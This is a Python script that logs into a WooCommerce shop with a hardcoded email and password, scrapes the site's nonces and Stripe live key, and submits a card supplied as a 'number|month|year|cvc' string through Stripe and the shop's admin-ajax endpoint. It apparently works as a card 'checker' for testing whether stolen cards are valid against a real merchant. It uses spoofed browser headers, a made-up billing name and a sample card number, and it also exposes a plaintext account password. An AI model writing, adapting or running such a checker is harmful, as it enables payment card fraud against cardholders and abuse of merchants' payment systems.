import requests
import re
import random
import string
import http.cookiejar as cookielib
import uuid

site = "https://catechdepot.com"
#site = "https://librairiejeunespousses.fr"
email = "baign0864@gmail.com"
password = "God@111899"

def generate_user_agent():
    return 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36'

def generate_random_account():
    name = ''.join(random.choices(string.ascii_lowercase, k=10))
    number = ''.join(random.choices(string.digits, k=4))
    return f"{name}{number}@gmail.com"

def generate_username():
    name = ''.join(random.choices(string.ascii_lowercase, k=10))
    number = ''.join(random.choices(string.digits, k=10))
    return f"{name}{number}"

def generate_random_code(length=32):
    letters_and_digits = string.ascii_letters + string.digits
    return ''.join(random.choice(letters_and_digits) for _ in range(length))

user_agent = generate_user_agent()
acc = generate_random_account()
username = generate_username()
corr = generate_random_code()
sess = generate_random_code()

cookie_jar = cookielib.MozillaCookieJar('cookies.jar')
r = requests.Session()
r.cookies = cookie_jar
domain = site.replace('https://', '').replace('http://', '')


import asyncio
async def autostr(cc):
    cards = cc.split('|')
    try:
        headers = {
    'authority': domain,
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'no-cache',
    'pragma': 'no-cache',
    'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'none',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': user_agent,
}
        print("🔐 Getting login nonce...")
        req = r.get(f'{site}/my-account/', headers=headers)
        nonce = re.search(r'id="woocommerce-login-nonce".*?value="(.*?)"', req.text).group(1)
        print(f"✅ Got login nonce: {nonce}")

        headers.update({
    'content-type': 'application/x-www-form-urlencoded',
    'origin': site,
    'referer': f'{site}/my-account/',
    'sec-fetch-site': 'same-origin',
})

        data = {
    'username': email,
    'password': password,
    'rememberme': 'forever',
    'woocommerce-login-nonce': nonce,
    '_wp_http_referer': '/my-account/',
    'login': 'Log in',
}

        print("🔐 Logging in...")
        r2 = r.post(f'{site}/my-account/', headers=headers, data=data)
        cookie_jar.save(ignore_discard=True, ignore_expires=True)
        print("✅ Logged in")

        headers.update({'referer': f'{site}/my-account/'})
        print("💳 Getting payment methods...")
        r3 = r.get(f'{site}/my-account/payment-methods/', headers=headers)

        print("💳 Getting add payment method page...")
        r4 = r.get(f'{site}/my-account/add-payment-method/', headers=headers)
        print(r4.text)

        acc_id = re.search(r'"accountId":"(acct_[0-9a-zA-Z]+)"', r4.text).group(1)

        print(acc_id)

        intent = re.search(r'"createSetupIntentNonce"\s*:\s*"([^"]+)"', r4.text)
        if not intent:
            intent = re.search(r'"add_payment_method_nonce"\s*:\s*"([^"]+)"', r4.text)
        intent = intent.group(1)

        action_match = re.search(r'"add_payment_method_action"\s*:\s*"([^"]+)"', r4.text)
        action_name = action_match.group(1) if action_match else 'create_setup_intent'

        print(f"🧠 Got payment intent nonce: {intent}")
        print(f"⚙️ Got action name: {action_name}")

        pk_match = re.search(r'"key":"(pk_live_[0-9a-zA-Z]+)"', r4.text)
        pk = pk_match.group(1) if pk_match else re.search(r'"publishableKey":"(pk_live_[0-9a-zA-Z]+)"', r4.text).group(1)
        print(f"🔑 Got Stripe public key: {pk}")

        noncec = re.search(r'"add_card_nonce"\s*:\s*"([^"]+)"', r4.text)
        if not noncec:
            noncec = re.search(r'id="woocommerce-add-payment-method-nonce"[^>]+value="([^"]+)"', r4.text)
        noncec = noncec.group(1)
        print(f"💠 Got add card nonce: {noncec}")

        headers = {
    'authority': 'api.stripe.com',
    'accept': 'application/json',
    'accept-language': 'en-US,en;q=0.9',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': user_agent,
}


        guid = "cac2827d-5443-419b-8bac-ee21c1f75eb51067b2" 
        muid = "44252c47-3f0f-43c4-9097-c449f797e84bd64bb1" 
        sid = "b93ab42d-2eb7-4913-a4b9-e5c0eb8d5350e8167f"  
        yy = cards[2]
        us_name = "Lucifer Murphy"
        us_country = "US"
        us_postal_code = "10080"
        us_card_number = cards[0]
        us_exp_month = cards[1]
        us_exp_year = yy[-2:]
        us_cvc = cards[3]

        data = (
    f"billing_details[name]={us_name}&"
    f"billing_details[email]={email}&"
    f"billing_details[address][country]={us_country}&"
    f"billing_details[address][postal_code]={us_postal_code}&"
    f"type=card&"
    f"card[number]={us_card_number}&"
    f"card[cvc]={us_cvc}&"
    f"card[exp_year]={us_exp_year}&"
    f"card[exp_month]={us_exp_month}&"
    f"allow_redisplay=unspecified&"
    f"pasted_fields=number&"
    f"payment_user_agent=stripe.js%2Fba4e3767a2%3B+stripe-js-v3%2Fba4e3767a2%3B+payment-element%3B+deferred-intent&"
    f"referrer={site}&"
    f"time_on_page=100340&"
    f"client_attribution_metadata[client_session_id]=46363bb5-29c2-4e7d-83ec-188cd46acde5&"
    f"client_attribution_metadata[merchant_integration_source]=elements&"
    f"client_attribution_metadata[merchant_integration_subtype]=payment-element&"
    f"client_attribution_metadata[merchant_integration_version]=2021&"
    f"client_attribution_metadata[payment_intent_creation_flow]=deferred&"
    f"client_attribution_metadata[payment_method_selection_flow]=merchant_specified&"
    f"guid={guid}&"
    f"muid={muid}&"
    f"sid={sid}&"
    f"key={pk}&"
    f"_stripe_account={acc_id}"
)

        #print("💳 Creating Stripe payment method...")
        r5 = r.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
        res = r5.json()
        #print(res)
        id = res['id']
        #print(f"✅ Got payment method ID: {id}")

        headers = {
    'authority': domain,
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.9',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': site,
    'referer': f'{site}/my-account/add-payment-method/',
    'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': user_agent,
}

        data = {
    'action': action_name,
    'wcpay-payment-method': id,
    '_ajax_nonce': intent,
}

        r6 = r.post(f'{site}/wp-admin/admin-ajax.php', cookies=cookie_jar, headers=headers, data=data)
        #print(r6.json())
        f = r6.json()
        return f
        
    except Exception as e:
        return e

    
    
    
    
    
cc = "5380390008300562|11|25|036"
r=asyncio.run(autostr(cc))
print(r)